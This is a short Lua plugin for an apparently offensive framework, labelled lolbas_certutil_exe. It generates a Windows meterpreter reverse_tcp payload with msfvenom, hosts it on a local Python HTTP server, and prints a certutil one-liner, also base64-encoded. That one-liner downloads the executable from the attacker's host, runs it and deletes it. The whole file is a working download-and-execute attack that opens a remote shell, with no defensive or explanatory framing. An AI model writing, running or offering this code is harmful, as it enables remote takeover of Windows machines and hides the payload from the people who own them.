-- Plugin: lolbas_certutil_exe - Descarga y ejecuta EXE con certutil
local function run_msfvenom(lhost, lport, path)
    os.execute(string.format("msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe > %s", lhost, lport, path))
end

register_command("lolbas_certutil_exe", function()
    local lhost = app.params["lhost"]
    local lport = app.params["lport"]
    local out_exe = "sessions/payload.exe"
    local url = "http://" .. lhost .. "/payload.exe"

    if not lhost or not lport then return "Error: set lhost and lport" end

    print("[*] Generating payload with msfvenom...")
    run_msfvenom(lhost, lport, out_exe)

    local cmd = string.format('certutil -urlcache -split -f %s payload.exe && start payload.exe && del payload.exe', url)

    app.one_cmd("encodewinbase64 " .. cmd)
    os.execute("cd sessions && python3 -m http.server 80 > /dev/null 2>&1 &")

    print("\n[🔥] One-liner (certutil):")
    print("\n" .. cmd .. "\n")
    return "✅ Payload: " .. out_exe
end)